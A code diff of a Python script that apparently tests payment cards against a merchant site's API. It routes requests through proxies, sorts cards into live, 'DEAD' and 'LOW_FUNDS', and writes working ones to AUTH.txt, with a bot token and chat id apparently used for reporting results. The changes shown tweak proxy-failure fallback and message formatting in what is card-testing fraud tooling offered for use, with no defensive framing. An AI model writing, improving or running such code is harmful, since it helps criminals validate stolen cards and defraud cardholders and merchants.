@@ -44,8 +44,11 @@ def fetch_nonce_and_key(api_url, headers, proxies=None, retries=3, delay=1):
                 if nonce_match and key_match:
                     return nonce_match.group(1), key_match.group(1)
         except Exception as e:
+            # Raise if proxy connection error to trigger fallback
+            if 'Unable to connect to proxy' in str(e) or 'Tunnel connection failed' in str(e):
+                raise Exception("Proxy connection error: " + str(e))
             logger.warning(f"Nonce/key fetch attempt {attempt+1} failed at {api_url}: {e}")
-        time.sleep(delay)
+            time.sleep(delay)
     return None, None
 
 def process_single_card_for_site(card_data, headers, uuids, chat_id, bot_token, api_url, proxy=None):
@@ -110,9 +113,7 @@ def process_single_card_for_site(card_data, headers, uuids, chat_id, bot_token, 
         resp_json = confirm_resp.json()
         success = resp_json.get('success', False)
         text = confirm_resp.text
-
         logger.info(f"Response text for card {card_data}: {text}")
-
         if success:
             with open('AUTH.txt', 'a') as f:
                 f.write(f"{card_data}\n")
@@ -132,7 +133,7 @@ def process_single_card_for_site(card_data, headers, uuids, chat_id, bot_token, 
             return "LOW_FUNDS", message, card_data
 
         error_msg = resp_json.get('data', {}).get('error', {}).get('message', 'Unknown error')
-        message = f"DEAD {card_data} >> {error_msg}"
+        message = f"DEAD {card_data} &gt;&gt; {error_msg}"
         return "DECLINED", message, card_data
 
     except Exception as e:
